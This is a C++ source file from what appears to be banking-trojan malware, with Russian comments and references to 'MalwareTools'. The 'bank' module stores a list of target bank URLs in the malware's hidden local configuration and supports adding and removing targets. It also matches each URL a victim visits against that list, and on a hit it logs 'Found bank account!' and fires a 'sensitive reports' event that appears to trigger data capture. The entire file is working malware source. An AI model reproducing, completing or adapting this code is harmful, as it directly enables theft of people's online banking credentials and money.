#include <Windows.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"
#include "localconfig.h"
#include "..\common\str.h"
#include "bank_catch.h"
#include "..\common\binstorage.h"
#include "localconfig.h"
#include "..\common\mem.h"
#include "..\common\debug.h"

CRITICAL_SECTION csupd;

static LPSTR urls;
static DWORD urlsSize;
static HANDLE eventHandle;
static HANDLE sensetiveHandle;

static bool isValidList(const LPSTR list, DWORD listSize)
{
  return (Str::_isValidMultiStringA(list, listSize));
}

bool bank::isBlank()
{
	return urlsSize == 0;
}

void WINAPI bank::proc(void* p)
{
	
	while(WaitForSingleObject(eventHandle, INFINITE) == WAIT_OBJECT_0)
	{
		BinStorage::STORAGE *config = LocalConfig::getCurrent();
	
		if(config != NULL)
		{
		
			EnterCriticalSection(&csupd);
			DWORD itemListSize;
			LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_BANK_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);
			
			if(itemList != NULL && isValidList(itemList, itemListSize))
			{
				Mem::reallocEx(&urls, (itemListSize)*sizeof(char));
				Mem::_copy(urls, itemList, itemListSize);
				urlsSize = itemListSize;
			}
			LeaveCriticalSection(&csupd);
			Mem::free(itemList);
			Mem::free(config);
		
		} 
	}
	
}

void bank::init()
{
	InitializeCriticalSection(&csupd);
	BinStorage::STORAGE *config = LocalConfig::getCurrent();
    if(config != NULL)
    {
      DWORD itemListSize;
      LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_BANK_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);
        
      if(itemList != NULL && isValidList(itemList, itemListSize))
      { 
		if(urls != NULL) Mem::free(urls);
        urls = (LPSTR)Mem::copyEx(itemList, itemListSize);
		urlsSize = itemListSize;
		
      }
	  

      Mem::free(itemList);
      Mem::free(config);
    }
	WCHAR objectName[50];
	Core::generateObjectName(Core::OBJECT_ID_BANK_LIST_ARRIVED, objectName, MalwareTools::KON_SESSION);
	eventHandle = CWA(kernel32, CreateEventW)(&coreData.securityAttributes.saAllowAll, TRUE, FALSE, objectName);
	Core::generateObjectName(Core::OBJECT_ID_REPORTS_SENSETIVE, objectName, MalwareTools::KON_SESSION);
	sensetiveHandle = CWA(kernel32, CreateEventW)(&coreData.securityAttributes.saAllowAll, TRUE, FALSE, objectName);
    CWA(kernel32, CreateThread)(NULL,0,(LPTHREAD_START_ROUTINE)proc,NULL,0, NULL);
}

void bank::uninit()
{
	Mem::free(urls);
	CloseHandle(eventHandle);
	CloseHandle(sensetiveHandle);
	urlsSize = 0;
}

bool bank::_addStatic(LPSTR url)
{
	WORD newItemSize;
  char newItem[256 + 1 + 1];

  //Генирируем элемент.
  {
    BYTE urlLen = (BYTE)Str::_LengthA(url);
    char *offset        = newItem;
    
    if(urlLen == 0)return false;

    newItemSize = (urlLen + 1);

    Str::_CopyA(offset, url, urlLen);

    CWA(user32, CharLowerBuffA)(newItem, newItemSize);
  }
  
  //Открываем конфигурацию.
  BinStorage::STORAGE *config = LocalConfig::beginReadWrite();
  if(config == NULL)return false;
    
  //Получем список сущетвующих элементов.
  bool ok = true;
  DWORD itemListSize;
  LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_BANK_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);

  //Если элемент существует, ищим клон.
  if(isValidList(itemList, itemListSize))
  {
    LPSTR curItem = itemList;
    do
    {
		
      //Проверяем доступно ли места больше чем, размер искомого элемента.
      if((DWORD)((itemList + itemListSize) - curItem) <= newItemSize)break;
      
      //Сравниваем.
      if(Mem::_compare(curItem, newItem, newItemSize) == 0)
      {
        WDEBUG0(WDDT_INFO, "Item already exists.");
        ok = false;
        break;
      }
    }
    while((curItem = Str::_multiStringGetIndexA(curItem, 1)) != NULL);
    
    if(ok == true && (ok = Mem::reallocEx(&itemList, itemListSize + newItemSize)) == true)
    {
		
      Mem::_copy2(itemList + itemListSize - 1, newItem, newItemSize + 1);
      ok = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_BANK_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, itemList, itemListSize + newItemSize);
    }
  }
  //Если элемент не найден, добавляем новый.
  else
  {
    if(itemList == NULL)ok = BinStorage::_addItem(&config, LocalConfig::ITEM_BANK_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItem, newItemSize + 1);
    else                ok = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_BANK_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItem, newItemSize + 1);
  }
  Mem::free(itemList);

  if(ok == false)
  {
    Mem::free(config);
    config = NULL;
  }
  ok = LocalConfig::endReadWrite(config);
  if(ok)PulseEvent(eventHandle);
  return ok;
}

bool bank::_removeStatic(LPSTR url)
{
	//Загружаем конфиг.
  BinStorage::STORAGE *config = LocalConfig::beginReadWrite();
  if(config == NULL)return false;

  //Получаем список элементов.
  DWORD itemListSize;
  LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_BANK_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);
  
  //Элементов нет.
  if(itemList == NULL)
  {
    Mem::free(config);
    return LocalConfig::endReadWrite(NULL);
  }

  //Проверяем правильность списка.
  bool changed = false;
  if(isValidList(itemList, itemListSize))
  {
    //Создаем копию списка для копирования в него, элементов не попавших под маску.
    LPSTR newItemList = (LPSTR)Mem::alloc(itemListSize);    
    if(newItemList != NULL)  
    {
      //Ишим элементы.
      LPSTR curItem = itemList;
      LPSTR offset  = newItemList;
      int len;

      do
      {
        LPSTR curUrl = curItem;

        if(Str::_matchExA(url, curUrl))
        {
          changed = true;
        }
        else
        {
          len = Str::_LengthA(curUrl);
          Str::_CopyA(offset, curUrl, len);
          offset += len + 1;

          *offset = 0; //Завершающий байт мульти-строки.
        }
      }
      while((curItem = Str::_multiStringGetIndexA(curItem, 1)) != NULL);
      
      if(changed == true)
      {
        if(offset == newItemList)offset--; //Почти аналог BinStorage::ITEMF_COMBINE_DELETE.
        changed = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_BANK_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItemList, offset - newItemList + 1);
      }
      Mem::free(newItemList);
    }
  }
  Mem::free(itemList);

  if(changed == false)
  {
    Mem::free(config);
    config = NULL;
  }

  return LocalConfig::endReadWrite(config);
}

void bank::_matchBank(LPSTR url)
{
	
	DWORD size = Str::_LengthA(url);
	if(url != NULL && !isBlank())
	{
		CWA(kernel32, EnterCriticalSection)(&csupd);
		LPSTR curItem = urls;
		do
		{
		  if(Str::_findSubStringA(url,curItem))
		  {
			WDEBUG0(WDDT_INFO, "Found bank account!");
			CWA(kernel32, SetEvent)(sensetiveHandle);
			break;
		  }
		}
		while((curItem = Str::_multiStringGetIndexA(curItem, 1)) != NULL);
		CWA(kernel32, LeaveCriticalSection)(&csupd);
	}
}